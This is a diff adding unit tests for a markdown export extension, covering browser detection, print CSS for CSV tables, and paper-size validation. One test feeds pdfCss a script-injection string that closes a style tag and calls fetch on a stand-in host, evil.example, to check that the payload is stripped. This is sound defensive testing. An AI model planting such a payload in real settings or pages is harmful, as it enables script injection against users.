@@ -53,6 +53,28 @@ describe('findBrowser', () => {
     // setting has to fall through to detection rather than be returned as a path.
     await expect(findBrowser('   ', 'win32', {})).resolves.toBeUndefined();
   });
+
+  // The two cases above both short-circuit on `configured`, so neither reaches the
+  // detection loop. That loop is what decides whether a whole platform gets the
+  // headless export or drops to printing by hand, and swapping its `bare ||` for a
+  // bare `isExecutable(candidate)` would silently strand every Linux user with the
+  // suite still green.
+  it('accepts a bare PATH name without touching the filesystem', async () => {
+    // No absolute Linux candidate is expected to exist on the machine running
+    // these tests, so returning `google-chrome` can only come from the bare-name
+    // branch, not from a probe that happened to succeed.
+    await expect(findBrowser(undefined, 'linux', {})).resolves.toBe('google-chrome');
+  });
+
+  it('probes absolute candidates and rejects the ones that are not there', async () => {
+    // Every Windows candidate is derived from these variables, so pointing them at
+    // a path that exists on no machine makes the whole list absolute and absent.
+    // That exercises the `isExecutable` half of the loop, and unlike asserting
+    // against the real /Applications or /usr/bin it does not change answer
+    // depending on which machine runs the suite.
+    const env = { ProgramFiles: 'Z:\\markcopy-test-nonexistent' };
+    await expect(findBrowser(undefined, 'win32', env)).resolves.toBeUndefined();
+  });
 });
 
 describe('printArgs', () => {
@@ -123,7 +145,27 @@ describe('pdfCss', () => {
   });
 
   it('drops the padding the preview keeps for scrolling past the end', () => {
-    expect(pdfCss('Letter')).toMatch(/\.markdown-body \{[^}]*padding: 0/);
+    expect(pdfCss('Letter')).toMatch(/@media print \{[^]*\.markdown-body \{[^}]*padding: 0/);
+  });
+
+  it('unclips the CSV grid, which sizes itself past the page margin', () => {
+    // preview.css sets `table.mc-csv { width: max-content }` at a specificity the
+    // generic `.markdown-body table` rule cannot reach, and a dragged column
+    // divider freezes widths inline, so both need !important here.
+    const css = pdfCss('Letter');
+    expect(css).toMatch(/table\.mc-csv \{[^}]*max-width: 100% !important/);
+    expect(css).toMatch(/table\.mc-csv col \{[^}]*width: auto !important/);
+  });
+
+  it('refuses a paper size that is not one of the three offered', () => {
+    // package.json's `enum` only constrains the settings editor. Anything can be
+    // hand-written into settings.json, and this string lands inside a <style> on a
+    // page that (unlike the webview) carries no CSP.
+    const hostile = '</style><script>fetch("https://evil.example")</script>';
+    const css = pdfCss(hostile as unknown as Parameters<typeof pdfCss>[0]);
+    expect(css).not.toContain('</style>');
+    expect(css).not.toContain('<script>');
+    expect(css).toContain('@page { size: Letter;');
   });
 });
 
